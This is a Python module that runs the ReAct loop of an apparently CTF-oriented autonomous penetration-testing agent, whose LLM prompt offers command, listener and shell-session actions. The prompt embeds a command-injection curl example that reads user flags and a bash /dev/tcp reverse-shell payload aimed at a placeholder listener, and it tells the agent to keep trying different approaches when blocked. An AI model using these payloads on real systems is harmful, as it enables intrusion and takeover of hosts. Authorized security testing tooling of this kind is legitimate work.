"""The ReAct loop: propose -> vet -> (run) -> observe -> propose. Handles four
action kinds — external command, arm listener, run in the held session, SSH.
Blocks and failures are non-fatal observations the model reacts to. Captured
flags become findings. Pure orchestration; side effects are injected or reached
through the session module."""
from __future__ import annotations
import re

from .actions import parse_action
from .guard import session_scope_ok
from . import session as sess
from atpt.toolbox import goal_tags as _goal_tags, service_tags_from_assets as _service_tags

_FLAG = re.compile(r"(?:flag|thm)\{[^}]{1,160}\}", re.IGNORECASE)

_PROMPT = (
    "You are an authorized penetration-testing agent working strictly within the "
    "engagement scope. Goal: {goal}\n\n"
    "Reply with ONE JSON action:\n"
    '  {{"command": ["bin","arg",...], "rationale": "..."}}  run a recon/exploit tool\n'
    '  {{"listen": {{"port": 4444}}, "rationale": "..."}}      arm a reverse-shell listener (returns host:port)\n'
    '  {{"session": "id", "rationale": "..."}}                run a command in the caught shell\n'
    '  {{"ssh": {{"host":"h","user":"u"}}}}                     open an SSH session (if you have creds)\n'
    '  {{"done": true}}                                         only when BOTH flags are captured\n\n'
    "HOW `command` RUNS: it is exec'd as a raw argv list with NO shell of your own. A "
    "';', '|', '&', '&&' or '>' written as a SEPARATE token is a literal argument, not "
    "a shell operator — it does nothing, and pipes/redirects on your side are "
    "unavailable. Always use the JSON array form so quoting is exact.\n"
    "EXPLOITING COMMAND INJECTION: put the ENTIRE shell payload as the SINGLE value of "
    "the vulnerable field — the TARGET's shell runs it, inside that field, not yours. "
    "Example (inject into a POST 'host' field):\n"
    '  {{"command":["curl","-sS","-m","20","--data-urlencode",'
    '"host=127.0.0.1; id; cat /home/*/user.txt","http://TARGET/internal/netcheck"]}}\n'
    "For a reverse shell, make that ONE value a BACKGROUNDED payload aimed at your "
    "listener, e.g. the field value:\n"
    "  127.0.0.1; bash -c 'bash -i >& /dev/tcp/LISTENER_IP/LISTENER_PORT 0>&1' &\n"
    "(the trailing ' &' lets the request return; use the exact host:port the listen "
    "action reported). Then send a session action to drive the caught shell.\n"
    "This runs on Kali — PREFER built-in tools first (searchsploit, metasploit, sqlmap, "
    "hydra, nmap NSE). Hand-write an exploit only if no built-in fits or it fails.\n"
    "Strategy: enumerate -> find a vulnerability -> foothold (read the user flag via "
    "your RCE or a reverse shell) -> enumerate privesc (sudo -l, SUID, caps, cron, and "
    "internal services listening on loopback — reachable through your foothold) -> "
    "escalate -> read the root flag. If blocked or a step fails, try a DIFFERENT "
    "in-scope approach — do not give up. Persist until BOTH flags are found.\n\n"
    "{playbook}Transcript so far:\n{transcript}\n")


def _scan_flags(text, source, findings, emit):
    for flag in set(_FLAG.findall(text or "")):
        findings.append({"title": f"Flag captured: {flag}", "severity": "critical",
                         "status": "validated", "domain": "Flag",
                         "evidence": {"flag": flag, "via": source}})
        emit("agent_flag", f"[agent] 🚩 FLAG: {flag}  (via {source})", data={"flag": flag})


def _build_playbook(hints):
    if not hints:
        return ""
    lines = ["LEARNED PLAYBOOK (suggestions from PAST wins — adapt them to THIS "
             "target; every command is still scope-checked, so a hint can never "
             "widen scope):"]
    for sk in hints:
        lines.append(f"- {sk.get('name')}: {sk.get('success_note', '')}")
        for s in (sk.get("steps") or [])[:4]:
            lines.append("    $ " + " ".join(s.get("command") or []))
    return "\n".join(lines) + "\n\n"


def run_loop(*, goal, guard, reason_fn, max_steps, emit, execute_fn, harvest_fn,
             scope=None, halt_fn=lambda: False, toolbox=None, distill_fn=None):
    scope = scope or {}
    assets, findings, transcript = [], [], []
    playbook, _svc_sig = "", None
    if toolbox is not None:
        try:
            playbook = _build_playbook(toolbox.search(_goal_tags(goal), []))
        except Exception:
            playbook = ""

    def _finish(summary):
        if toolbox is not None and distill_fn is not None and findings:
            try:
                skill = distill_fn(goal, "\n".join(transcript))
                if skill:
                    p = toolbox.save(skill)
                    if p:
                        emit("agent_skill_saved",
                             f"[agent] learned skill '{skill.get('name')}' -> {p.name}",
                             data={"skill": skill.get("name")})
            except Exception as e:
                emit("agent_skill_error", f"[agent] skill distill failed: {e}", level="warn")
        return assets, findings, summary

    reasoner_failures = 0
    for step in range(1, max_steps + 1):
        if halt_fn():
            break
        if toolbox is not None:
            st = _service_tags(assets)
            sig = tuple(st)
            if st and sig != _svc_sig:
                _svc_sig = sig
                try:
                    playbook = _build_playbook(toolbox.search(_goal_tags(goal), st))
                except Exception:
                    pass
        text = reason_fn(_PROMPT.format(goal=goal, playbook=playbook,
                                        transcript="\n".join(transcript[-24:])))
        if not text:
            reasoner_failures += 1
            if reasoner_failures >= 2:
                return _finish("agent_no_reasoner: reasoning ladder returned nothing")
            continue
        reasoner_failures = 0
        action = parse_action(text)
        if action is None:
            transcript.append("OBSERVATION: could not parse an action; reply with ONE JSON action.")
            continue

        if action.kind == "done":
            return _finish(f"done: {action.rationale or 'goal met'}")

        if action.kind == "listen":
            r = sess.start_listener(action.port or 0, scope=scope)
            if r.get("ok"):
                emit("agent_listen", f"[agent] listener up on {r['listen']}")
                transcript.append(
                    f"OBSERVATION: listener READY on {r['listen']}. Trigger a reverse "
                    f"shell to THIS host:port from the target via your exploit, then run "
                    f"a session command.")
            else:
                transcript.append(f"OBSERVATION: listener failed: {r.get('error')}")
            continue

        if action.kind == "session":
            if not sess.is_active():
                sess.wait_caught(4)
            if not sess.is_active():
                transcript.append("OBSERVATION: no active session yet — arm a listener and "
                                  "trigger a reverse shell first (or the callback hasn't arrived).")
                continue
            ok, reason = session_scope_ok(action.session_cmd, scope)
            if not ok:
                emit("agent_blocked", f"[agent] session blocked: {reason}", level="warn")
                transcript.append(f"BLOCKED: {reason}. Stay on the in-scope target.")
                continue
            if halt_fn():
                break
            emit("agent_session", f"[agent] session$ {action.session_cmd}",
                 data={"rationale": action.rationale})
            out = sess.session_exec(action.session_cmd, timeout=45)
            _scan_flags(out, f"session:{action.session_cmd}", findings, emit)
            transcript.append(f"SESSION$ {action.session_cmd}\n{out[:1600]}")
            continue

        if action.kind == "ssh":
            transcript.append("OBSERVATION: SSH sessions aren't wired yet — get a foothold "
                              "with a reverse shell instead (arm a listener + trigger a callback).")
            continue

        # kind == command
        verdict = guard.vet(action.argv)
        if verdict.blocked:
            emit("agent_blocked", f"[agent] blocked: {verdict.reason} :: {' '.join(action.argv)}",
                 level="warn")
            transcript.append(f"BLOCKED: {verdict.reason}. Propose a different in-scope action.")
            continue
        if halt_fn():
            break
        emit("agent_step", f"[agent] run: {' '.join(action.argv)}", data={"rationale": action.rationale})
        result = execute_fn(action.argv)
        new_assets, new_findings = harvest_fn(action.argv, result)
        assets += new_assets
        findings += new_findings
        blob = (result.get("out", "") or "") + (result.get("err", "") or "")
        _scan_flags(blob, " ".join(action.argv), findings, emit)
        transcript.append(f"RAN: {' '.join(action.argv)} (rc={result.get('rc')})\n"
                          f"OBSERVATION: {blob[:1600]}")

    if halt_fn():
        return _finish("stopped by operator between steps")
    return _finish(f"step budget reached ({max_steps} steps)")
